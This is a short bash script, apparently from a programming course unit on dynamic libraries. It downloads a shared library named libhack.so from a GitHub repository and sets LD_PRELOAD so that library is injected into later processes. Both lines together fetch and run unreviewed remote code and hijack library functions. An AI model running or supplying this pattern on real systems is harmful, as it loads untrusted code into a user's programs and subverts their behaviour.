#!/bin/bash
wget -P .. https://raw.githubusercontent.com/rona4ld/alx-low_level_programming/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
